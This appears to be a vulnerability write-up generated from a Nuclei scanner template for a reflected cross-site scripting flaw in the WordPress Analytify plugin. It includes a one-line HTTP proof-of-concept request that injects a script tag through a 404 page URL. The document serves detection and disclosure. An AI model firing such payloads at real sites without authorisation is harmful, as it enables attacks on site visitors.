# Nuclei Template: Analytify <4.2.1 - Cross-Site Scripting
**Template ID:** analytify-plugin-xss
**Vulnerability Class:** Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)
**Severity:** Medium
**CWE:** CWE-80
**Source:** Nuclei Template (`analytify-plugin-xss.yaml`)

## Vulnerability Information & PoC

## Description
WordPress Analytify 4.2.1 does not escape the current URL before outputting it back in a 404 page when the 404 tracking feature is enabled, leading to reflected cross-site scripting.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/aa404bb?a</script><script>alert(/XSS/)</script>
```

## References
- https://wpscan.com/vulnerability/b8415ed5-6fd0-42fe-9201-73686c1871c5
